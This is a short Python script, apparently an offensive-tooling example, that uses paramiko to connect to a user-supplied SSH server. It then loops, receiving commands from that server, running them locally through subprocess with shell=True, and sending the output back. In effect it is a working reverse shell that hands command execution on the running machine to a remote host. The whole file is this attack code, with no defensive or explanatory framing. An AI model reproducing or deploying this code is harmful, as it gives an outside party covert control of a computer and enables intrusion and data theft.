import paramiko
import subprocess
import shlex


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=user, password=passwd)
        ssh_session = client.get_transport().open_session()

        if ssh_session.active:
            ssh_session.send(command)
            print(ssh_session.recv(1024).decode())

            while True:
                command = ssh_session.recv(1024)

                try:
                    cmd = command.decode()
                    if cmd == 'exit':
                        client.close()
                        break

                    cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                    ssh_session.send(cmd_output or 'okay')
                except Exception as e:
                    ssh_session.send(str(e))
    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your username and password.")
    except paramiko.SSHException as e:
        print(f"SSH connection failed: {str(e)}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        client.close()


if __name__ == '__main__':
    import getpass

    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = int(input('Enter port: '))

    ssh_command(ip, port, user, password, 'ClientConnected')
